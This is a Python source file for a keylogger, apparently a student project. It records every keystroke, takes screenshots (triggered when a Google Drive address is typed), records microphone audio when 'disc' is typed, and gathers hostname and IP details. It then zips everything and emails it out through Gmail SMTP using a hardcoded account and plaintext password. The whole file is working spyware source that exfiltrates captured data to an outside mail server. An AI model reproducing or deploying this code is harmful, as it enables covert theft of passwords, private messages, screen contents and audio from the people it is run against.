# Keylogger

# Libraries
import shutil
import smtplib
import ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from datetime import datetime

import socket
import platform

from scipy.io.wavfile import write
import sounddevice as sd
from requests import get
import os
import zipfile
import time

session_folder = str(datetime.now().strftime("%Y-%m-%d %H.%M.%S"))
os.mkdir(session_folder)

sender_email = "tnm031keylogger@gmail.com"
receiver_email = "tnm031keylogger@gmail.com"
password = "tnm031pizza"

subject = "Keys logged"
body = "This is an email with attachment sent from Python"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

message.attach(MIMEText(body, "plain"))

# Global storage of keys for the keylogger
keys = []


def screenshot(image_name):
    im = ImageGrab.grab()
    im.save(os.path.join(session_folder, image_name))


# Declare the function to return all file paths of the particular directory
def retrieve_file_paths(dirName):
    # setup file paths variable
    filePaths = []

    # Read all directory, subdirectories and file lists
    for root, directories, files in os.walk(dirName):
        for filename in files:
            # Create the full filepath by using os module.
            filePath = os.path.join(root, filename)
            filePaths.append(filePath)

    # return all paths
    return filePaths


def send_mail(filename):
    with open(filename, "rb") as attachment:
        # Add file as application/octet-stream
        # Email client can usually download this automatically as attachment
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        part.add_header('Content-Disposition', "attachment", filename=session_folder + ".zip")

    encoders.encode_base64(part)

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


# get the computer information
def computer_information():
    with open(os.path.join(session_folder, "systeminfo.txt"), "a") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception as e:
            f.write(str(e))

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ipaddr + "\n")


computer_information()


def microphone():
    fs = 44100
    seconds = 10

    recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1) # Test if channels=1 works on windows, else 2
    sd.wait()

    write(os.path.join(session_folder, "audio.wav"), fs, recording)


def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False


def on_press(key):
    global keys

    if key == keyboard.Key.esc:
        screenshot(str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + '.png')

    elif key == keyboard.Key.space:
        keys.append(" ")

    elif key == keyboard.Key.space:
        keys.append(" ")

    elif key == keyboard.Key.enter:
        keys.append("\n")
        s = "".join(keys)
        if s.find("drive.google.com") != -1:
            time.sleep(2)
            screenshot("Google-drive-" + str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + '.png')
            time.sleep(2)
            screenshot("Google-drive-" + str(datetime.now().strftime("%Y-%m-%d %H.%M.%S")) + '.png')

        # "disc" is usually used when the conversation should go to discord
        if s.find("disc") != -1:
            time.sleep(5)
            microphone()

        with open(os.path.join(session_folder, "log_results.txt"), "a") as f:
            f.write(s)
        keys = []
    else:
        k = str(key).replace("'", "")
        keys.append(k)


def main():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    # Assign the name of the directory to zip
    dir_name = os.path.abspath(os.path.join(os.getcwd(), session_folder))

    # Call the function to retrieve all files and folders of the assigned directory
    filePaths = retrieve_file_paths(dir_name)
    print(filePaths)

    # printing the list of all files to be zipped
    print('The following list of files will be zipped:')
    for fileName in filePaths:
        print(fileName)

    # writing files to a zipfile
    zip_file = zipfile.ZipFile(dir_name + '.zip', 'w')

    with zip_file:
        # writing each file one by one
        for file in filePaths:
            zip_file.write(file)

    print(dir_name + '.zip file is created successfully!')
    shutil.rmtree(dir_name)

    send_mail(str(dir_name + ".zip"))
    os.remove(dir_name + ".zip")


if __name__ == '__main__':
    main()
